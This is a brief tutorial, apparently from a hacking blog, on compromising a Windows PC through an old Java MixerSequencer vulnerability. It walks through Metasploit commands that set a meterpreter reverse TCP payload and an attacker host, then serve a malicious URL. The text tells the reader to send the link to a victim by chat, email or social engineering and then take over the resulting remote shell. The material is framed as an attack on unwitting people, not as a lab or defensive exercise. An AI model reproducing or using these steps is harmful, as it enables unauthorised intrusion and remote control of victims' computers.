Hack Windows PC with Java MixerSequencer Object GM_Song Structure Handling Vulnerability

This module exploits a flaw within the handling of MixerSequencer objects in Java 6u18 and before. Exploitation id done by supplying a specially crafted MIDI file within an RMF File. When the MixerSequencer objects is used to play the file, the GM Song structure is populated with a function pointer provided by a SONG block in the RMF. A Midi block that contains a MIDI with a specially crafted controller event is used to trigger the vulnerability. When triggering the vulnerability “ebx” points to a fake event in the MIDI file which stores the shell code. A “jmp ebx” from msvcr71.dll is used to make the exploit reliable over java updates.
Windows 7

Attacker: Backtrack 5
Victim PC: Windows 7
Open backtrack terminal type msfconsole

Now type use exploit/windows/browser/java_mixer_sequencer
Msf exploit (java_mixer_sequencer)>set payload windows/meterpreter/reverse_tcp
Msf exploit (java_mixer_sequencer) set lhost 192.168.1.6 (IP of Local Host)
Msf exploit (java_mixer_sequencer)>set srvhost 192.168.1.6 (This must be an address on the local machine)
Msf exploit (java_mixer_sequencer)>set uripath javamixer (The Url to use for this exploit)
Msf exploit (java_mixer_sequencer)>exploit

Now an URL you should give to your victim http://192.168.1.6:8080/javamixer

Send the link of the server to the victim via chat or email or any social engineering technique.
Now you have access to the victims PC. Use “Sessions -l” and the Session number to connect to the session. And Now Type “sessions -i ID“
